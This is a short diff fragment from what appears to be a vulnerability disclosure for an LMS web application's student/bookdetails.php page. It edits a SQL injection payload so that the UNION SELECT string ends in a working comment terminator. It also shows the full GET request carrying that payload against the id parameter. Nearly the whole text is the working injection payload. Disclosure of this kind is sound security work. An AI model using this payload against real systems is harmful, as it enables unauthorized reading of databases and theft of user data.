@@ -8,7 +8,7 @@ Vulnerability File: /LMS/student/bookdetails.php?id=
 
 Vulnerability location: /LMS/student/bookdetails.php?id=, id
 
-[+] Payload: /LMS/student/bookdetails.php?id=-191%27%20union%20select%201,2,3,4,5,6,7,8,9,10- // Leak place ---> id
+[+] Payload: /LMS/student/bookdetails.php?id=-191%27%20union%20select%201,2,3,4,5,6,7,8,9,10--+ // Leak place ---> id
 
 ```sql
 GET /LMS/student/bookdetails.php?id=-191%27%20union%20select%201,2,3,4,5,6,7,8,9,10--+ HTTP/1.1
